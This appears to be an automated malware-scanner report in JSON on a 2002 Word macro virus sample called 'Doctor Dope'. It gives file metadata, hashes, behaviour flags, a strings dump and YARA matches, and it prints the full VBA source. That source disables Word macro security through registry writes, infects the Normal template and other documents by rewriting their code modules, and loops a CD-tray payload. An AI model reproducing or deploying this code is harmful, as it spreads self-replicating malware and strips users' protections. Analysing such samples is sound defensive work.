{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"DrDope\""
        ],
        "behavior": {
            "AccessVBOM": "May attempt to disable VBA macro security and Protected View",
            "AddFromString": "May attempt to modify the VBA code",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CodeModule": "May attempt to modify the VBA code",
            "Document_Close": "Runs when the Word document is closed",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Lib": "May run code from a DLL",
            "System": "May run an executable file or a system command on a Mac",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "call": "May call a DLL using Excel 4 Macros",
            "open": "May open a file"
        },
        "macro": "WMXP.DrDope\n\n\nPrivate Declare Function mciSendString Lib \"winmm.dll\" Alias \"mciSendStringA\" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long\nPrivate Sub Document_Open()\nOn Error Resume Next\n'VirusName: Doctor Dope\n'coded by Necronomikon\n'Info: Written for a friend of mine!We all call him Doctor Dope(Steve)!?;)\nApplication.ScreenUpdating = False\nApplication.DisplayAlerts = wdAlertsNone\nCommandBars(\"Macro\").Controls(\"Security...\").Enabled = False\n'--- cut here ---\n'this code is taken from XP.Kallisti by jackie/lz0\nSystem.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Word\\Security\", \"Level\") = 1&\nIf System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Word\\Security\", \"AccessVBOM\") <> 1& Then\nSystem.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Word\\Security\", \"AccessVBOM\") = 1&\n'--- cut here ---\nSystem.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security\", \"Level\") = 1&\nWith Options\n.ConfirmConversions = False\n.VirusProtection = False\nEnd With\nSet AD = ActiveDocument.VBProject.VBComponents.Item(1)\nSet NT = NormalTemplate.VBProject.VBComponents.Item(1)\nNT1 = NT.CodeModule.CountOfLines\nAD1 = AD.CodeModule.CountOfLines\nNec = 2\nIf AD.Name <> \"ddope\" Then\nIf AD1 > 0 Then AD.CodeModule.DeleteLines 1, AD1\nSet ToInfect = AD\nAD.Name = \"ddope\"\nDoAD = True\nEnd If\nIf NT.Name <> \"ddope\" Then\nIf NT1 > 0 Then NT.CodeModule.DeleteLines 1, NT1\nSet ToInfect = NT\nNT.Name = \"ddope\"\nDoNT = True\nEnd If\nIf DoNT <> True And DoAD <> True Then GoTo bye\nIf DoNT = True Then\nDo While AD.CodeModule.Lines(1, 1) = \"\"\nAD.CodeModule.DeleteLines 1\nLoop\nToInfect.CodeModule.AddFromString (\"Private Sub Document_Close()\")\nDo While AD.CodeModule.Lines(Nec, 1) <> \"\"\nToInfect.CodeModule.InsertLines Nec, AD.CodeModule.Lines(Nec, 1)\nNec = Nec + 1\nLoop\nEnd If\nEnd If\nIf DoAD = True Then\nDo While NT.CodeModule.Lines(1, 1) = \"\"\nNT.CodeModule.DeleteLines 1\nLoop\nToInfect.CodeModule.AddFromString (\"Private Sub Document_Open()\")\nDo While NT.CodeModule.Lines(Nec, 1) <> \"\"\nToInfect.CodeModule.InsertLines Nec, NT.CodeModule.Lines(Nec, 1)\nNec = Nec + 1\nLoop\nEnd If\nbye:\nIf NT1 <> 0 And AD1 = 0 And (InStr(1, ActiveDocument.Name, \"Document\") = False) Then\nActiveDocument.SaveAs FileName:=ActiveDocument.FullName\nElseIf (InStr(1, ActiveDocument.Name, \"Document\") <> False) Then\nActiveDocument.Saved = True: End If\nCall Payload\nEnd Sub\nPrivate Sub Payload()\nOn Error Resume Next\n'Thanks WalruS for code!;)\nDo\nmciSendString \"set cd door open\", 0, 0, 0: mciSendString \"set cd door closed\", 0, 0, 0: mciSendString \"set cd time format tmsf wait\", 0, 0, 0: mciSendString \"open cdaudio alias cd wait shareable\", 0, 0, 0\nLoop\nEnd Sub\n\n\n"
    },
    "filename": "VirusShare_be5fc5660d9d622ad75c8984b508e4a8",
    "filesize": 31744,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.10, Code page: 1250, Template: Normal.dot, Last Saved By: Spokojen uivatel Microsoft Office, Revision Number: 1, Name of Creating Application: Microsoft Word 10.0, Total Editing Time: 01:00, Create Time/Date: Tue Mar 26 21:04:00 2002, Last Saved Time/Date: Tue Mar 26 21:05:00 2002, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "be5fc5660d9d622ad75c8984b508e4a8",
        "sha1": "6097ac50871fd35a2ca4ee10d3a1608497973b30",
        "sha256": "5310680e4f6b8f2293070b6e37b408d4d6fcb79fe62ccf150c91b2a35320191b"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj22",
            "/ =!",
            "cFcF",
            "Nzev",
            " Written",
            "a fri",
            "L of min e!We ",
            "him\t",
            "(Steve)!?;$Applica",
            ".ScreenUpd",
            "@]= E",
            "yAleHrts",
            "on{D]Bars",
            "(\"Ma",
            "-\").Control@",
            "Secu",
            "-y..r.",
            "--- cut `here ",
            " A is tak;rom ",
            "K6isti ",
            "j@cie/lz0",
            "System",
            ".\u0116Profil",
            "ez(\"\", \"",
            "HKEY_CUR",
            "RENT_USER\\Softw",
            "(\\Mi,s@",
            "ffice\\10",
            ".0\\Word\\",
            "(l\")",
            "Acces sVBOM",
            "<> 1& TheA",
            "9.WisDOpaWs",
            "irmMvers7SDK.bl`Ate;",
            "\tFet( AD`:A@",
            "ve\u0465w.VB",
            "\\p ]nts.I)L(1@hS",
            "deModu",
            "untOf&L@x@",
            "Nec`",
            "B`C\"dd\"",
            "D#S!\t> 0",
            "DeleteQ",
            " 1, 1!To ",
            "Do\"&CA)Ifb",
            "NT.v",
            "ah GoTo `%",
            "#lDo Wh #I1",
            "1@\"Q",
            "Loop",
            "AddF@M3J (\"eqSIdClz()\"",
            " !, ",
            "e.Ins[",
            " + !c",
            "bye:u21!",
            "(I%Hq5@lIRh",
            "RN)T",
            "SaveM F+",
            "\u0453 Payload@",
            "?e*2Th",
            "anks WalXruS\"A!!DHo",
            "\"s Zcd doQn0|h0, !",
            "c!7d",
            "`mat tmsf waito",
            " cdaudi",
            "o`\tA",
            " sh?`q",
            "mciSendStringA",
            "Attribute VB_Name = \"DrDope\"",
            "VirusName: Doctor Dope",
            "coded by Necronomikon",
            "Info: Written for a friend of mine!We all call him Doctor Dope(Steve)!?;)",
            "Security...",
            "Macro",
            "--- cut here ---",
            "this code is taken from XP.Kallisti by jackie/lz0",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Word\\Security",
            "Level",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Word\\Security",
            "AccessVBOM ",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Word\\Security",
            "AccessVBOM ",
            "--- cut here ---",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security",
            "Level",
            "ddope",
            "ddope",
            "ddope",
            "ddope",
            "Private Sub Document_Close()",
            "Private Sub Document_Open()",
            "Document",
            "Document",
            "Thanks WalruS for code!;)",
            "set cd door open",
            "set cd door closed",
            "set cd time format tmsf wait",
            "open cdaudio alias cd wait shareable",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VGlobal!",
            "Spac",
            "Crea",
            "tabl",
            "Pre decla",
            "BExp",
            "Temp",
            "lateDeri",
            "$Custom",
            "izC1WMXP.DrDop",
            "P.2 ",
            "DU Funct",
            "ion mciS",
            "endS",
            "Lib \"win",
            "mm.dll\" Alias \"",
            "A\" (ByVa",
            "l lpstrC",
            "ommand A$s ",
            "Return.",
            "@Length L",
            "hwnd",
            "Callback",
            "G4Sub ",
            "_Open()",
            "On Err@or Res",
            "Next",
            "'VPirusAG:",
            "CO'cod^bBy",
            "cronZk",
            "Infas",
            "call",
            "WordS1 ",
            "VBA ",
            "Win16",
            "Win32",
            "Mac ",
            "VBA6# ",
            "Project1",
            "stdole` ",
            "Project- ",
            "ThisDocument< ",
            "_Evaluate",
            "Normal ",
            "Office",
            "WMXP' ",
            "DrDope  ",
            "mciSendString",
            "lpstrCommand",
            "lpstrReturnString+ ",
            "uReturnLength>",
            "hwndCallback",
            "winmm.dll ",
            "Document_Open ",
            "Documentj ",
            "Application* ",
            "ScreenUpdating!",
            "DisplayAlerts ",
            "wdAlertsNone ",
            "CommandBars",
            "ControlsK ",
            "Enabled\u06ea ",
            "System",
            "PrivateProfileString[",
            "Options ",
            "ConfirmConversions",
            "VirusProtectionoD ",
            "AD~\\ ",
            "ActiveDocument\\ ",
            "VBProjectOh ",
            "VBComponents",
            "Itemz ",
            "NTo^ ",
            "NormalTemplateq ",
            "NT1 ",
            "CodeModule",
            "CountOfLines!\\ ",
            "AD1r ",
            "Nec ",
            "DeleteLines",
            "ToInfect ",
            "DoAD( ",
            "DoNT",
            "byeZ{ ",
            "Lines ",
            "AddFromString ",
            "InsertLines ",
            "SaveAsf; ",
            "FileNamej ",
            "FullName\u041e ",
            "Savedd ",
            "Payloadz ",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "c2.tlb#O",
            "LE Automation",
            "D@NormalDNABr",
            "*\\CK",
            "!OPfficfO`fP",
            "!G{2DF8D",
            "04C-5BFA",
            "-101B-BDE5fAAd4",
            "2fgram ",
            "Files\\Co",
            "mmon",
            "rosoft S@hared\\",
            "0\\MSO.DL",
            " 10.",
            "0 Ob Li`brary%",
            "dThisDoc",
            "umentG",
            "h@5s",
            "u@Ie",
            "nU@n",
            ",!:\"B",
            "ThisDocument",
            "ID=\"{83BAAEEB-4105-11D6-BF21-A88C897B9510}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "VersionCompatible32=\"393222000\"",
            "CMG=\"0F0DEAFDF6030107010701070107\"",
            "DPB=\"1E1CFB0E05121513151315\"",
            "GC=\"2D2FC81BD82BD92BD9D4\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=22, 22, 470, 359, Z",
            "Dokument Microsoft Word",
            "MSWordDoc",
            "Word.Document.8",
            "Normal.dot",
            "Spokojen uivatel Microsoft Office",
            "Microsoft Word 10.0",
            "Nzev"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.302435",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
